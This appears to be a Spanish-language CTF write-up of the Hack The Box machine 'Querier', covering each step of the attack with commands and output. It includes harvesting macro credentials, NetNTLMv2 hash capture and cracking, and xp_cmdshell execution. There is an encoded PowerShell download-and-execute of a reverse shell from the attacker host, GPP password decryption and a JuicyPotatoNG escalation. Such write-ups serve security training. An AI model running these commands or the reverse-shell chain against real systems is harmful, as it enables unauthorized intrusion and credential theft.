---
layout: post
title: Querier
date: 2023-02-16
description:
img:
fig-caption:
tags: [OSCP, OSEP]
---
___

<center><img src="/writeups/assets/img/Querier-htb/Querier.png" alt="" style="height: 394px; width:520px;"></center>

***

# Conocimientos

* Inspección de macros con Olevba

* Interceptación de hash NetNTLMv2

* RCE en MSSQL (xp_cmdshell)

* Backup archivo GPP (Escalada de Privilegios)

* Abuso SeImpersonatePrivileage (Escalada no intencionada)

***

# Reconocimiento

## Escaneo de puertos con nmap

### Descubrimiento de puertos abiertos

```null
nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.125 -oG openports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 16:10 GMT
Nmap scan report for 10.10.10.125
Host is up (0.065s latency).
Not shown: 57304 closed tcp ports (reset), 8217 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 24.72 seconds
```

### Escaneo de versión y servicios de cada puerto

```null
nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.10.10.125 -oN portscan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 16:14 GMT
Nmap scan report for 10.10.10.125
Host is up (0.11s latency).

PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ssl-date: 2023-02-16T16:15:16+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2023-02-16T16:09:29
|_Not valid after:  2053-02-16T16:09:29
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-16T16:15:09
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.07 seconds

```

## Puerto 135 (RPC)

No tengo acceso con un null session

```null
rpcclient -U "" 10.10.10.125 -N -c 'enumdomusers'
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```

## Puerto 445 (SMB)

Con crackmapexec aplico un escaneo para ver dominio, hostname y versiones

```null
crackmapexec smb 10.10.10.125
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
```

Añado el dominio ```htb.local``` al ```/etc/hosts```

Puedo listar los recursos compartidos

```null
smbmap -H 10.10.10.125 -u 'null'
[+] Guest session   	IP: 10.10.10.125:445	Name: htb.local                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	Reports                                           	READ ONLY	
```

Dentro del directorio ```Reports``` hay un documento de excel

```null
smbmap -H 10.10.10.125 -u 'null' -r 'Reports'
[+] Guest session   	IP: 10.10.10.125:445	Name: htb.local                                         
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	Reports                                           	READ ONLY	
	.\Reports\*
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	.
	dr--r--r--                0 Mon Jan 28 23:26:31 2019	..
	fr--r--r--            12229 Mon Jan 28 23:26:31 2019	Currency Volume Report.xlsm
```

Lo descargo para ver su contenido

```null
smbmap -H 10.10.10.125 -u 'null' --download 'Reports/Currency Volume Report.xlsm'
[+] Starting download: Reports\Currency Volume Report.xlsm (12229 bytes)

mv 10.10.10.125-Reports_Currency\ Volume\ Report.xlsm CurrencyVolumeReport.xlsm
```

Al abrirlo con ```libreoffice``` detecta que tiene macros

<img src="/writeups/assets/img/Querier-htb/1.png" alt="">

Se pueden ver desde ahí, pero para extraerlas y trabajar más comodamente voy a utilizar [oleva](https://github.com/decalage2/oletools)

```null
olevba -c CurrencyVolumeReport.xlsm
olevba 0.60.1 on Python 3.10.9 - http://decalage.info/python/oletools
===============================================================================
FILE: CurrencyVolumeReport.xlsm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

' macro to pull data for client volume reports
'
' further testing required

Private Sub Connect()

Dim conn As ADODB.Connection
Dim rs As ADODB.Recordset

Set conn = New ADODB.Connection
conn.ConnectionString = "Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6"
conn.ConnectionTimeout = 10
conn.Open

If conn.State = adStateOpen Then

  ' MsgBox "connection successful"
 
  'Set rs = conn.Execute("SELECT * @@version;")
  Set rs = conn.Execute("SELECT * FROM volume;")
  Sheets(1).Range("A1").CopyFromRecordset rs
  rs.Close

End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: xl/vbaProject.bin - OLE stream: 'VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
```

Dentro hay credenciales de acceso a la base de datos

```null
mssqlclient.py 'htb.local/reporting:PcwTWTHRwryjc$c6@10.10.10.125'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] ERROR(QUERIER): Line 1: Login failed for user 'reporting'.
```

En principio no me puedo conectar. La valido por SMB, pero no encuentra el usuario a nivel de dominio. En cambio, para el workstation sí

```null
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6'
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [-] HTB.LOCAL\reporting:PcwTWTHRwryjc$c6 STATUS_NO_LOGON_SERVERS 
```

```null
crackmapexec smb 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKSTATION
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKSTATION) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKSTATION\reporting:PcwTWTHRwryjc$c6 
```

Pero no puedo ganar acceso por WINRM

```null
crackmapexec winrm 10.10.10.125 -u 'reporting' -p 'PcwTWTHRwryjc$c6' -d WORKSTATION
HTTP        10.10.10.125    5985   10.10.10.125     [*] http://10.10.10.125:5985/wsman
WINRM       10.10.10.125    5985   10.10.10.125     [-] WORKSTATION\reporting:PcwTWTHRwryjc$c6
```

Vuelvo a intentar autenticarme al MSSQL, pero a nivel de WORKGROUP

```null
mssqlclient.py 'WORKGROUP/reporting:PcwTWTHRwryjc$c6@10.10.10.125' -windows-auth
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL> 
```

No puedo ejecutar comandos con ```xp_cmdshell```

```null
SQL> xp_cmdshell "whoami"
[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
SQL> sp_configure "show advanced options", 1
[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
```

Pero con ```xp_dirtree```, si me deja cargar un recurso compartido a nivel de red de mi lado, por lo que puedo interceptar un hash NetNTLMv2

```null
SQL> xp_dirtree "\\10.10.16.4\leak"
```

```null
responder -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C

[+] Listening for events...

[SMB] NTLMv2-SSP Client   : 10.10.10.125
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:a5748bb6a868404a:7596706CC1326FCEC30FD0DB454D224E:010100000000000000D2614B2742D901768B46A3741861B60000000002000800350052004C00330001001E00570049004E002D0044004900530033005200330031004C004E004200440004003400570049004E002D0044004900530033005200330031004C004E00420044002E00350052004C0033002E004C004F00430041004C0003001400350052004C0033002E004C004F00430041004C0005001400350052004C0033002E004C004F00430041004C000700080000D2614B2742D90106000400020000000800300030000000000000000000000000300000358F748AA91A7613A11E7582AEF0BC7726B2151CE1DE991E2C3950E61659C30C0A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E003400000000000000000000000000
```

Lo crackeo y obtengo la contraseña en texto claro

```null
john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
corporate568     (mssql-svc)     
1g 0:00:00:06 DONE (2023-02-16 16:55) 0.1663g/s 1490Kp/s 1490Kc/s 1490KC/s correemilio..cornamona
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```

Son válidas por SMB

``null
crackmapexec smb 10.10.10.125 -u 'mssql-svc' -p 'corporate568' -d WORKGROUP
SMB         10.10.10.125    445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
SMB         10.10.10.125    445    QUERIER          [+] WORKGROUP\mssql-svc:corporate568
```

Puedo intentar ejecutar comandos desde MSSQL con este usuario

```null
SQL> sp_configure "show advanced options", 1
[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> sp_configure "xp_cmdshell", 1
[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install.
SQL> reconfigure
SQL> xp_cmdshell "whoami"
output                                                                             

--------------------------------------------------------------------------------   

querier\mssql-svc                                                                  

NULL                                                                               
```

Para ganar acceso al sistema, utilizo ```Invoke-ConPtyShell.ps1```

```null
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/Invoke-ConPtyShell.ps1')" | iconv -t utf-16le | base64 -w 0 | xclip -sel clip
```

```null
SQL> xp_cmdshell "powershell -e SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADQALwBJAG4AdgBvAGsAZQAtAEMAbwBuAFAAdAB5AFMAaABlAGwAbAAuAHAAcwAxACcAKQAKAA=="
```

Puedo visualizar la primera flag

```null
PS C:\Users\mssql-svc\Desktop> type user.txt 
05dae6deda77dfe1509020712493881f 
```

# Escalada

Subo el ```winpeas.exe``` a la máquina víctima. Encuentra un archivo ```groups.xml```, con la contraseña del usuario Administrador encriptada

```null
+----------¦ Found Misc-Passwords1 Regexes
C:\Users\All Users\VMware\VMware CAF\pme\install\caf-dbg.ps1: password = $null,

C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml: password="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74Ke
UWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties></User></Groups>
C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml: password="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9Jrhw
YRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties></User></Groups>
C:\Users\All Users\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml: password="CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw
74KeUWc2+BeOVDQ" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="Administrator"></Properties></User></Groups>
```

Como Microsoft publicó la clave AES, se puede obtener la credencial en texto claro

```null
gpp-decrypt CiDUq6tbrBL1m/js9DmZNIydXpsE69WB9JrhwYRW9xywOz1/0W5VCUz8tBPXUkk9y80n4vw74KeUWc2+BeOVDQ
MyUnclesAreMarioAndLuigi!!1!
```

Otra forma es utilizando ```PowerUp.ps1``` para encontrar formas de escalar privilegios

```null
PS C:\Temp> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.4/PowerUp.ps1') 
PS C:\Temp> Invoke-AllChecks                     


Privilege   : SeImpersonatePrivilege
Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED 
TokenHandle : 1332
ProcessId   : 3844
Name        : 3844
Check       : Process Token Privileges

ServiceName   : UsoSvc 
Path          : C:\Windows\system32\svchost.exe -k netsvcs -p 
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
CanRestart    : True
Name          : UsoSvc
Check         : Modifiable Services

ModifiablePath    : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps 
IdentityReference : QUERIER\mssql-svc
Permissions       : {WriteOwner, Delete, WriteAttributes, Synchronize...}
%PATH%            : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Name              : C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps
Check             : %PATH% .dll Hijacks
AbuseFunction     : Write-HijackDll -DllPath 'C:\Users\mssql-svc\AppData\Local\Microsoft\WindowsApps\wlbsctrl.dll' 

UnattendPath : C:\Windows\Panther\Unattend.xml 
Name         : C:\Windows\Panther\Unattend.xml 
Check        : Unattended Install Files        

Changed   : {2019-01-28 23:12:48} 
UserNames : {Administrator}
NewName   : [BLANK]
Passwords : {MyUnclesAreMarioAndLuigi!!1!}
File      : C:\ProgramData\Microsoft\Group Policy\History\{31B2F340-016D-11D2-945F-00C04FB984F9}\Machine\Preferences\Groups\Groups.xml 
Check     : Cached GPP Files
```

Extree la contraseña en texto claro automáticamente

Me conecto y veo la segunda flag

```null
evil-winrm -i 10.10.10.125 -u 'Administrator' -p 'MyUnclesAreMarioAndLuigi!!1!'

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
d50d96669491cf471633cf4e5673b4e5
```


# Escalada (No intencionada)

Tengo el ```SeImpersonatePrivilege```

```null
PS C:\Users\mssql-svc\Desktop> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

La versión de Windows es la siguiente

```null
PS C:\Users\mssql-svc\Desktop> systeminfo | Select-String "OS NAME"
                                                                                
OS Name:                   Microsoft Windows Server 2019 Standard 
```

Pruebo a enviarme trazas ICMP, utilizando ```JuicyPotatoNG.exe```

```null
PS C:\Temp> .\JuicyPotatoNG.exe -t * -p cmd.exe -a "/c ping 10.10.16.4"


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247  
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation 
[-] CreateProcessAsUser Failed to create proc: 2 
[+] CreateProcessWithTokenW OK
```

```null
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
17:23:01.559387 IP 10.10.10.125 > 10.10.16.4: ICMP echo request, id 1, seq 1, length 40
17:23:01.559564 IP 10.10.16.4 > 10.10.10.125: ICMP echo reply, id 1, seq 1, length 40
17:23:02.173721 IP 10.10.10.125 > 10.10.16.4: ICMP echo request, id 1, seq 2, length 40
17:23:02.173768 IP 10.10.16.4 > 10.10.10.125: ICMP echo reply, id 1, seq 2, length 40
17:23:03.300161 IP 10.10.10.125 > 10.10.16.4: ICMP echo request, id 1, seq 3, length 40
17:23:03.300206 IP 10.10.16.4 > 10.10.10.125: ICMP echo reply, id 1, seq 3, length 40
17:23:04.323851 IP 10.10.10.125 > 10.10.16.4: ICMP echo request, id 1, seq 4, length 40
17:23:04.323956 IP 10.10.16.4 > 10.10.10.125: ICMP echo reply, id 1, seq 4, length 40
```

Puedo ejecutar comandos como nt authority\system, me envío una reverse shell de la mima forma que antes

```null
PS C:\Windows\system32> whoami
nt authority\system
```